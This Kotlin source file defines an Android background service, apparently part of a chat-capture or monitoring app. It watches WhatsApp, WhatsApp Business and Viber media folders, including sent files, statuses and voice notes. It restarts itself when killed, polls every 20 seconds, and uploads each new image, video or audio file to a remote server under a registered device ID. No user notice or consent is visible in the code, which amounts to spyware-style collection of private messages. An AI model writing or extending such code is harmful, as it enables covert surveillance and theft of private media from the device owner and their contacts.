package com.chats.capture.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import com.chats.capture.CaptureApplication
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.UploadStatus
import com.chats.capture.utils.FileUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber
import java.io.File

/**
 * Service that monitors social media app directories (WhatsApp, WhatsApp Business, Viber)
 * for new images, videos, and audio files and uploads them immediately to the server
 */
class SocialMediaMonitorService : Service() {
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var mediaObserver: ContentObserver? = null
    private val processedFiles = mutableSetOf<String>() // Track processed files to avoid duplicates
    
    // Social media app packages
    private val whatsappPackage = "com.whatsapp"
    private val whatsappBusinessPackage = "com.whatsapp.w4b"
    private val viberPackage = "com.viber.voip"
    
    // Maximum file size for upload (20MB)
    private val MAX_UPLOAD_SIZE = 20 * 1024 * 1024L // 20MB
    
    override fun onCreate() {
        super.onCreate()
        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
            Timber.tag("SOCIAL_MEDIA_MONITOR").i("🛑 Capture disabled - stopping SocialMediaMonitorService")
            stopSelf()
            return
        }
        Timber.tag("SOCIAL_MEDIA_MONITOR").i("🚀 SocialMediaMonitorService created - Monitoring WhatsApp, WhatsApp Business, and Viber")
        startMonitoring()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Restart if killed
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        stopMonitoring()
        Timber.tag("SOCIAL_MEDIA_MONITOR").w("⚠️ SocialMediaMonitorService destroyed")
    }
    
    private fun startMonitoring() {
        try {
            // Monitor MediaStore for new media files
            val mediaUris = listOf(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            )
            
            mediaObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    scope.launch {
                        delay(3000) // Wait 3 seconds for file to be fully written
                        checkForNewSocialMediaFiles()
                    }
                }
            }
            
            mediaUris.forEach { uri ->
                contentResolver.registerContentObserver(
                    uri,
                    true,
                    mediaObserver!!
                )
            }
            
            // Also monitor app-specific directories using file system watcher
            scope.launch {
                // Initial scan after 5 seconds
                delay(5000)
                checkForNewSocialMediaFiles()
                
                // Periodic scan every 20 seconds (more frequent than downloads)
                while (true) {
                    delay(20000)
                    checkForNewSocialMediaFiles()
                }
            }
            
            Timber.tag("SOCIAL_MEDIA_MONITOR").i("✅ Social media monitoring started")
        } catch (e: Exception) {
            Timber.tag("SOCIAL_MEDIA_MONITOR").e(e, "Error starting social media monitoring")
        }
    }
    
    private fun stopMonitoring() {
        mediaObserver?.let {
            contentResolver.unregisterContentObserver(it)
            mediaObserver = null
        }
    }
    
    private suspend fun checkForNewSocialMediaFiles() {
        try {
            // Scan WhatsApp directories
            scanWhatsAppDirectories()
            
            // Scan WhatsApp Business directories
            scanWhatsAppBusinessDirectories()
            
            // Scan Viber directories
            scanViberDirectories()
        } catch (e: Exception) {
            Timber.tag("SOCIAL_MEDIA_MONITOR").e(e, "Error checking for new social media files")
        }
    }
    
    private suspend fun scanWhatsAppDirectories() {
        val directories = getWhatsAppMediaDirectories()
        directories.forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                scanDirectory(dir, whatsappPackage, depth = 0)
            }
        }
    }
    
    private suspend fun scanWhatsAppBusinessDirectories() {
        val directories = getWhatsAppBusinessMediaDirectories()
        directories.forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                scanDirectory(dir, whatsappBusinessPackage, depth = 0)
            }
        }
    }
    
    private suspend fun scanViberDirectories() {
        val directories = getViberMediaDirectories()
        directories.forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                scanDirectory(dir, viberPackage, depth = 0)
            }
        }
    }
    
    private fun getWhatsAppMediaDirectories(): List<File> {
        val directories = mutableListOf<File>()
        val externalStorage = Environment.getExternalStorageDirectory()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ - WhatsApp stores media in app-specific directory
            val androidMediaDir = File(
                externalStorage,
                "Android/media/$whatsappPackage/WhatsApp/Media"
            )
            
            // WhatsApp Images
            directories.add(File(androidMediaDir, "WhatsApp Images"))
            directories.add(File(androidMediaDir, "WhatsApp Images/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Images/.Statuses"))
            
            // WhatsApp Videos
            directories.add(File(androidMediaDir, "WhatsApp Video"))
            directories.add(File(androidMediaDir, "WhatsApp Video/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Video/.Statuses"))
            
            // WhatsApp Audio
            directories.add(File(androidMediaDir, "WhatsApp Audio"))
            directories.add(File(androidMediaDir, "WhatsApp Audio/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Audio/Voice Notes"))
        } else {
            // Android 9 and below
            val whatsappMediaDir = File(externalStorage, "WhatsApp/Media")
            
            directories.add(File(whatsappMediaDir, "WhatsApp Images"))
            directories.add(File(whatsappMediaDir, "WhatsApp Images/Sent"))
            directories.add(File(whatsappMediaDir, "WhatsApp Images/.Statuses"))
            directories.add(File(whatsappMediaDir, "WhatsApp Video"))
            directories.add(File(whatsappMediaDir, "WhatsApp Video/Sent"))
            directories.add(File(whatsappMediaDir, "WhatsApp Video/.Statuses"))
            directories.add(File(whatsappMediaDir, "WhatsApp Audio"))
            directories.add(File(whatsappMediaDir, "WhatsApp Audio/Sent"))
            directories.add(File(whatsappMediaDir, "WhatsApp Audio/Voice Notes"))
        }
        
        // Also check legacy location
        val legacyWhatsAppDir = File(externalStorage, "WhatsApp/Media")
        if (legacyWhatsAppDir.exists()) {
            directories.add(File(legacyWhatsAppDir, "WhatsApp Images"))
            directories.add(File(legacyWhatsAppDir, "WhatsApp Video"))
            directories.add(File(legacyWhatsAppDir, "WhatsApp Audio"))
        }
        
        return directories
    }
    
    private fun getWhatsAppBusinessMediaDirectories(): List<File> {
        val directories = mutableListOf<File>()
        val externalStorage = Environment.getExternalStorageDirectory()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val androidMediaDir = File(
                externalStorage,
                "Android/media/$whatsappBusinessPackage/WhatsApp Business/Media"
            )
            
            directories.add(File(androidMediaDir, "WhatsApp Business Images"))
            directories.add(File(androidMediaDir, "WhatsApp Business Images/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Business Images/.Statuses"))
            directories.add(File(androidMediaDir, "WhatsApp Business Video"))
            directories.add(File(androidMediaDir, "WhatsApp Business Video/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Business Video/.Statuses"))
            directories.add(File(androidMediaDir, "WhatsApp Business Audio"))
            directories.add(File(androidMediaDir, "WhatsApp Business Audio/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Business Audio/Voice Notes"))
        } else {
            val whatsappBusinessMediaDir = File(externalStorage, "WhatsApp Business/Media")
            
            directories.add(File(whatsappBusinessMediaDir, "WhatsApp Business Images"))
            directories.add(File(whatsappBusinessMediaDir, "WhatsApp Business Images/Sent"))
            directories.add(File(whatsappBusinessMediaDir, "WhatsApp Business Video"))
            directories.add(File(whatsappBusinessMediaDir, "WhatsApp Business Video/Sent"))
            directories.add(File(whatsappBusinessMediaDir, "WhatsApp Business Audio"))
            directories.add(File(whatsappBusinessMediaDir, "WhatsApp Business Audio/Sent"))
        }
        
        return directories
    }
    
    private fun getViberMediaDirectories(): List<File> {
        val directories = mutableListOf<File>()
        val externalStorage = Environment.getExternalStorageDirectory()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val androidMediaDir = File(
                externalStorage,
                "Android/media/$viberPackage"
            )
            
            directories.add(File(androidMediaDir, "Viber"))
            directories.add(File(androidMediaDir, "Viber/Images"))
            directories.add(File(androidMediaDir, "Viber/Videos"))
            directories.add(File(androidMediaDir, "Viber/Audio"))
            directories.add(File(androidMediaDir, "Viber/Voice Notes"))
        } else {
            val viberDir = File(externalStorage, "Viber")
            
            directories.add(File(viberDir, "Viber"))
            directories.add(File(viberDir, "Viber/Images"))
            directories.add(File(viberDir, "Viber/Videos"))
            directories.add(File(viberDir, "Viber/Audio"))
            directories.add(File(viberDir, "Viber/Voice Notes"))
        }
        
        // Also check common Viber locations
        directories.add(File(externalStorage, "ViberMedia"))
        directories.add(File(externalStorage, "ViberMedia/Images"))
        directories.add(File(externalStorage, "ViberMedia/Videos"))
        directories.add(File(externalStorage, "ViberMedia/Audio"))
        
        return directories
    }
    
    private suspend fun scanDirectory(
        directory: File,
        appPackage: String,
        depth: Int = 0
    ) {
        try {
            // Limit recursion depth
            if (depth > 5) return
            
            directory.listFiles()?.forEach { file ->
                if (file.isFile && !processedFiles.contains(file.absolutePath)) {
                    // Check if file is new (modified in last 10 minutes)
                    val tenMinutesAgo = System.currentTimeMillis() - (10 * 60 * 1000)
                    if (file.lastModified() > tenMinutesAgo) {
                        // Check if it's a media file
                        if (isMediaFile(file)) {
                            val fileSize = file.length()
                            // Check file size (must be <= 20MB)
                            if (fileSize > 0 && fileSize <= MAX_UPLOAD_SIZE) {
                                processedFiles.add(file.absolutePath)
                                Timber.tag("SOCIAL_MEDIA_MONITOR").i(
                                    "📱 New ${appPackage} media detected: ${file.name} (${fileSize / (1024 * 1024)}MB)"
                                )
                                uploadFileImmediately(file, appPackage)
                            } else if (fileSize > MAX_UPLOAD_SIZE) {
                                Timber.tag("SOCIAL_MEDIA_MONITOR").w(
                                    "⚠️ File size ${fileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping upload: ${file.name}"
                                )
                                // Don't save to database - file is too large
                            }
                        }
                    }
                } else if (file.isDirectory) {
                    // Recursively scan subdirectories
                    scanDirectory(file, appPackage, depth + 1)
                }
            }
        } catch (e: Exception) {
            Timber.w(e, "Error scanning directory: ${directory.absolutePath}")
        }
    }
    
    private fun isMediaFile(file: File): Boolean {
        val extension = file.extension.lowercase()
        val imageExtensions = listOf("jpg", "jpeg", "png", "webp", "gif", "bmp")
        val videoExtensions = listOf("mp4", "webm", "mov", "avi", "mkv", "3gp", "m4v")
        val audioExtensions = listOf("mp3", "ogg", "m4a", "opus", "aac", "wav", "amr")
        
        return extension in imageExtensions || 
               extension in videoExtensions || 
               extension in audioExtensions
    }
    
    private suspend fun uploadFileImmediately(file: File, appPackage: String) {
        try {
            val database = (applicationContext as CaptureApplication).database
            val mediaFileDao = database.mediaFileDao()
            val deviceRegistrationManager = DeviceRegistrationManager(this)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            // Calculate checksum
            val checksum = FileUtils.calculateChecksum(file)
            
            // Check if file already exists (by checksum)
            val existing = mediaFileDao.findMediaFileByChecksum(checksum)
            if (existing != null && existing.uploadStatus == UploadStatus.SUCCESS) {
                Timber.tag("SOCIAL_MEDIA_MONITOR").d("File already uploaded: ${file.name}")
                return
            }
            
            // Determine MIME type
            val mimeType = FileUtils.getMimeTypeFromFile(file)
            
            // Create MediaFile entry
            val mediaFile = MediaFile(
                deviceId = deviceId,
                notificationId = "social_media_${appPackage}_${System.currentTimeMillis()}_${file.name}",
                appPackage = appPackage,
                localPath = file.absolutePath,
                fileSize = file.length(),
                mimeType = mimeType,
                checksum = checksum,
                uploadStatus = UploadStatus.PENDING
            )
            
            // Save to database
            mediaFileDao.insertMediaFile(mediaFile)
            Timber.tag("SOCIAL_MEDIA_MONITOR").d("File saved to database: ${mediaFile.id}")
            
            // Upload immediately
            val mediaUploadManager = MediaUploadManager(
                this,
                mediaFileDao,
                database.notificationDao(),
                database.chatDao()
            )
            
            val success = mediaUploadManager.uploadMediaFile(mediaFile)
            if (success) {
                Timber.tag("SOCIAL_MEDIA_MONITOR").i("✅ ${appPackage} media uploaded immediately: ${file.name}")
            } else {
                Timber.tag("SOCIAL_MEDIA_MONITOR").w("⚠️ ${appPackage} media upload queued (will retry): ${file.name}")
            }
        } catch (e: Exception) {
            Timber.tag("SOCIAL_MEDIA_MONITOR").e(e, "Error uploading ${appPackage} file immediately: ${e.message}")
        }
    }
    
}
